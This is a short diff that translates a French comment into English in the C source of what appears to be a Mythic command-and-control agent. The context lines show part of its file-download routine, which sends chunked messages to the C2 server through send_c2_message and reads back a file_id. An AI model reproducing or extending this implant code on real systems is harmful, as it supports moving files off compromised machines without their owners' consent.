@@ -106,7 +106,7 @@ void command_download(char *task_id, char *params) {
     char *b64_resp = send_c2_message(json_msg);
     free(json_msg);
 
-    /* Le premier chunk : extraire le file_id retourné par Mythic */
+    /* First chunk: extract the file_id returned by Mythic */
     if (chunk_num == 1) {
       if (b64_resp) {
         char *json_resp =
